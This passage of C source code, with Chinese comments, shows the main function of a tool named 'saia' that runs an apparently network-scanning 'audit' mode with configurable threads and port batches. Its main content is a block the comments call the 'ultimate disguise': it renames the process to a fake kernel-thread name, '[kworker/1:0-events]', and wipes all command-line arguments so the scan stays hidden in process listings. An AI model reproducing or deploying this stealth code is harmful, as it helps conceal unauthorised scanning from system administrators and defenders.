                if (buf[0] == '\n' || buf[0] == 'q' || buf[0] == 'Q' || buf[0] == '0') break;
            }
        }
#endif
    }

    return 0;
}



// ==================== 主函数 ====================

int main(int argc, char *argv[]) {
    setlocale(LC_ALL, "");

    /* 先解析一次启动参数；后续会做 argv 伪装清空 */
    int cli_run_audit = 0;
    int cli_mode = 0;
    int cli_scan_mode = 0;
    int cli_threads = 0;
    int cli_port_batch_size = 0;

    if (argc >= 2 && strcmp(argv[1], "--run-audit") == 0) {
        cli_run_audit = 1;
        if (argc >= 5) {
            cli_mode = atoi(argv[2]);
            cli_scan_mode = atoi(argv[3]);
            cli_threads = atoi(argv[4]);
        }
        if (argc >= 6) {
            cli_port_batch_size = atoi(argv[5]);
        }
    }

    // -----------------------------------------------------------------
    // 【终极伪装】系统级进程名称篡改 (必须放在 main 函数的第一步)
    // -----------------------------------------------------------------
#ifndef _WIN32
    const char *stealth_name = "[kworker/1:0-events]";

#if defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__) || defined(__APPLE__)
    setproctitle("-%s", stealth_name);
#endif

    size_t name_len = strlen(argv[0]);
    if (name_len >= strlen(stealth_name)) {
        strncpy(argv[0], stealth_name, name_len);
    } else {
        strncpy(argv[0], stealth_name, name_len);
        argv[0][name_len] = '\0';
    }

    for (int i = 1; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
#endif
    // -----------------------------------------------------------------

#ifdef _WIN32
    SetConsoleCtrlHandler(saia_console_handler, TRUE);
    SetConsoleOutputCP(65001); /* UTF-8 */
#else
    signal(SIGINT,  saia_signal_handler);
    signal(SIGTERM, saia_signal_handler);
    signal(SIGHUP,  saia_signal_handler);
    signal(SIGPIPE, SIG_IGN);
#endif

    /* 初始化配置 */
    if (config_init(&g_config, getenv("HOME") ? getenv("HOME") : ".") != 0) {
        fprintf(stderr, "配置初始化失败\n");
        return 1;
    }

    if (cli_run_audit) {
        int mode = (cli_mode >= 1 && cli_mode <= 4) ? cli_mode : g_config.mode;
        int scan_mode = (cli_scan_mode >= 1 && cli_scan_mode <= 3) ? cli_scan_mode : g_config.scan_mode;
        int threads = (cli_threads > 0) ? cli_threads : g_config.threads;

        if (threads < 1) threads = 1;

        int port_batch_size = 5;
        if (cli_port_batch_size > 0) {
            port_batch_size = cli_port_batch_size;
        }
        if (port_batch_size < 1) port_batch_size = 1;
        if (port_batch_size > 30) port_batch_size = 30;

        return saia_run_audit_internal(mode, scan_mode, threads, port_batch_size);
    }

    saia_print_banner();

    /* 进入交互式主循环 */
    saia_interactive_mode();

    saia_cleanup();
    return 0;
}
